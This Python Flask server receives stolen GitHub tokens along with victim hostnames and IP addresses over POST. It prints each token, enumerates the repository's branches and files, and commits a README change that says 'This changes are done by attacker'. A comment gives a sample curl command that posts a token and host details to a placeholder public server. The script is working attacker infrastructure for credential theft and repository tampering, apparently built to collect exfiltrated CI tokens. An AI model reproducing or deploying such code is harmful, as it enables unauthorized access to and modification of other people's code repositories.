import re
import os
from datetime import datetime
from github import Github
from flask import Flask, request, jsonify
from colorama import Fore, Style

app = Flask(__name__)

def fetch_readme_and_update(token, repo_url):
    """
    Fetch and update the README.md file of a GitHub repository with the current date, time, and hostname.

    :param token: GitHub personal access token
    :param repo_url: Full repository URL (e.g., https://github.com/org/repo)
    :return: Dictionary with repository details or error message
    """
    try:
        # Extract repository name from URL
        match = re.search(r"github\.com[:/](.+?)/(.+)", repo_url)
        if not match:
            return {"error": "Invalid repository URL format"}

        repository_name = match.group(1) + "/" + match.group(2)

        # Authenticate with GitHub API
        g = Github(token)

        # Fetch repository
        repo = g.get_repo(repository_name)

        # Fetch branches
        branches = [branch.name for branch in repo.get_branches()]

        # Fetch files
        files = []
        contents = repo.get_contents("")
        while contents:
            file_content = contents.pop(0)
            if file_content.type == "dir":
                contents.extend(repo.get_contents(file_content.path))
            else:
                files.append(file_content.path)

        # Fetch and update README.md
        readme_content = ""
        try:
            readme = repo.get_contents("README.md")
            readme_content_read_only = readme.decoded_content.decode("utf-8")
            print(f"\n{Fore.CYAN}{Style.BRIGHT}{readme_content_read_only}\n")
        except Exception:
            print("not able to read the README.md")
        try:
            readme = repo.get_contents("README.md")
            readme_content = readme.decoded_content.decode("utf-8")
            print(f"\n{Fore.CYAN}{Style.BRIGHT}{readme_content}\n")
            
            # Update README.md with current date, time, and hostname
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            hostname = os.uname().nodename
            updated_content = f"{readme_content}\n\nUpdated on: {current_time}\nHost: {hostname}"+"This changes are done by attacker"
            
            # Commit the updated README.md
            repo.update_file(
                path=readme.path,
                message="Update README.md with date, time, and hostname",
                content=updated_content,
                sha=readme.sha
            )
            readme_content = updated_content

        except Exception:
            readme_content = "README.md not found"

        # Print details in bold red
        print(f"\n{Fore.RED}{Style.BRIGHT}Token: {token}")
        print(f"Repository URL: {repo_url}")
        print(f"Repository Name: {repository_name}")
        print(f"Branches: {branches}")
        print(f"Files: {files}")
        print(f"Updated README.md Content:\n{readme_content}{Style.RESET_ALL}\n")

        # Return details
        return {
            "branches": branches,
            "files": files,
            "readme": readme_content
        }

    except Exception as e:
        return {"error": str(e)}

# Flask route to handle POST requests
@app.route('/fetch_readme', methods=['POST'])
def fetch_readme_route():
    data = request.json
    token = data.get("token")
    repo_url = data.get("repo_url")
    hostname=data.get("hostname")
    publicip=data.get("ip")

    if not token or not repo_url:
        return jsonify({"error": "Both 'token' and 'repo_url' are required"}), 400
    print(f"\n{Fore.BLUE}{Style.BRIGHT}----------------------------------------------------------------\n\n")
    result = fetch_readme_and_update(token, repo_url)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}hostname: {hostname}")
    print(f"\nPublicIP: {publicip}")
    print(f"\n{Fore.BLUE}{Style.BRIGHT}----------------------------------------------------------------\n\n")
    return jsonify(result)

if __name__ == "__main__":
    app.run(debug=True)
# Sample curl command to test the endpoint:
# curl -X POST -H "Content-Type: application/json" -d '{"token": "ghs_ioHTGZbWYS4bj8oA", "repo_url": "https://github.com/Test/Test","hostname":"ABCD","ip":"1.2.3.4"}' http://Public_URL_OR_IP:5000/fetch_readme
